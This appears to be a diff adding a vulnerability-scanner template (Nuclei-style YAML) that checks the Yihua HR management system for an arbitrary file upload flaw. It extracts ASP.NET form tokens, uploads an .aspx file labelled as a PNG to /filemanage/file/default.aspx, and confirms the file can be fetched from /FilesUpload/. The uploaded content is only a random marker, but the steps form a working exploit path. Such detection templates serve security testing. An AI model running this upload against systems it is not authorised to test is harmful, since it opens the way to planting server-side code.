@@ -1,0 +1,93 @@
+id: poc-yaml-yihua-hr-ms-default-anyfile-upload
+info:
+  name: 亿华人力资源管理系统 default 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: "step-1"
+    method: GET
+    path:
+      - "{{BaseURL}}/filemanage/file/default.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "EHR -- 文件管理"
+    extractors:
+      - type: regex
+        name: VIEWSTATE
+        internal: true
+        part: body
+        regex:
+          - "id=\"__VIEWSTATE\" value=\"(.*?)\""
+        group: 1
+      - type: regex
+        name: VIEWSTATEGENERATOR
+        internal: true
+        part: body
+        regex:
+          - "id=\"__VIEWSTATEGENERATOR\" value=\"(.*?)\""
+        group: 1
+
+  - id: "step-2"
+    method: POST
+    path:
+      - "{{BaseURL}}/filemanage/file/default.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----geckoformboundary787f61f28ad8b037c0c81d8883ef3b37"
+    body: |
+      ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+      Content-Disposition: form-data; name="__VIEWSTATE"
+
+      {{VIEWSTATE}}
+      ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+      Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+      {{VIEWSTATEGENERATOR}}
+      ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+      Content-Disposition: form-data; name="fileToUpload"; filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+      Content-Disposition: form-data; name="UploadBtn"
+
+      上传文件
+      ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "EHR -- 文件管理"
+          - "文件上传成功"
+
+  - id: "step-3"
+    method: GET
+    path:
+      - "{{BaseURL}}/FilesUpload/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
